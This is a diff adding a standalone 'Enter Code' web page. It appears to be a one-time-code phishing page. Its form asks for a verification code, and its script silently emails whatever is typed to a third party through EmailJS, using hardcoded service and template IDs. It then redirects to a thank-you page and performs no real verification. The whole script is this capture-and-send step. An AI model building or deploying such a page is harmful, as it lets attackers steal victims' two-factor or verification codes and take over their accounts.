@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Enter Code</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: sans-serif;
+    }
+
+    body, html {
+      height: 100%;
+      background: #f0f4f8;
+    }
+
+    .form-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+    }
+
+    form {
+      background: white;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 400px;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+      text-align: center;
+      color: #333;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #007bff;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #0056b3;
+    }
+
+    .message {
+      margin-top: 10px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <form id="codeForm">
+      <h2>Enter Code</h2>
+      <input type="text" id="code" name="code" placeholder="Enter verification code" required />
+      <button type="submit">Submit</button>
+      <div class="message" id="message"></div>
+    </form>
+  </div>
+
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    // Initialize EmailJS
+    (function(){
+      emailjs.init("wkI_zzv-LS-eRPwAA"); // Replace with your EmailJS Public Key
+    })();
+
+    document.getElementById("codeForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const codeValue = document.getElementById("code").value;
+
+      emailjs.send("service_xuw4eys", "template_c0462aw", {
+        code: codeValue
+      })
+      
+      .then(() => {
+  window.location.href = "thanks.html"; // ✅ redirect after success
+}, (error) => {
+        document.getElementById("message").innerText = "Error sending code.";
+        console.error("EmailJS error:", error);
+      });
+    });
+  </script>
+</body>
+</html>
